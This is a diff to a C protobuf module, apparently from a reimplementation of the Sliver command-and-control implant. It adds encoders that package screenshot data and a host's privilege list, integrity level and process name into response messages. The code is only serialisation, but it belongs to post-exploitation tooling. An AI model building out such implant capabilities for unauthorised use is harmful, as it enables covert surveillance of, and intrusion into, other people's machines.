@@ -1,5 +1,6 @@
 /* src/proto/proto.c - minimal protobuf writer/reader and Sliver messages. */
 #include "sliver/fs.h"
+#include "sliver/privs.h"
 #include "sliver/registry.h"
 #include "sliver/proc.h"
 #include "sliver/proto.h"
@@ -1417,3 +1418,53 @@ int sliver_reg_names_encode(sliver_buf_t *out, char (*names)[256], int count, co
 int sliver_empty_response_encode(sliver_buf_t *out, const char *err) {
   return encode_response(out, err);
 }
+
+/* --- Screenshot --------------------------------------------------------- */
+int sliver_screenshot_encode(sliver_buf_t *out, const uint8_t *data, size_t len, const char *err) {
+  if (out == NULL) {
+    return -1;
+  }
+  if (len != 0 && sliver_buf_put_bytes(out, 1, data, len) != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+/* --- GetPrivs ----------------------------------------------------------- */
+int sliver_getprivs_encode(sliver_buf_t *out, const sliver_priv_t *privs, int count,
+                           const char *integrity, const char *process_name, const char *err) {
+  int i;
+
+  if (out == NULL) {
+    return -1;
+  }
+  for (i = 0; i < count; ++i) {
+    sliver_buf_t entry;
+
+    sliver_buf_init(&entry);
+    if (sliver_buf_put_string(&entry, 1, privs[i].name) != 0 ||
+        sliver_buf_put_string(&entry, 2, privs[i].description) != 0 ||
+        (privs[i].enabled && sliver_buf_put_bool(&entry, 3, 1) != 0) ||
+        (privs[i].enabled_by_default && sliver_buf_put_bool(&entry, 4, 1) != 0) ||
+        (privs[i].removed && sliver_buf_put_bool(&entry, 5, 1) != 0)) {
+      sliver_buf_free(&entry);
+      return -1;
+    }
+    if (sliver_buf_put_tag(out, 1, 2) != 0 || sliver_buf_put_varint(out, entry.len) != 0 ||
+        sliver_buf_append(out, entry.data, entry.len) != 0) {
+      sliver_buf_free(&entry);
+      return -1;
+    }
+    sliver_buf_free(&entry);
+  }
+  if (integrity != NULL && integrity[0] != 0 && sliver_buf_put_string(out, 2, integrity) != 0) {
+    return -1;
+  }
+  if (process_name != NULL && process_name[0] != 0 &&
+      sliver_buf_put_string(out, 3, process_name) != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+
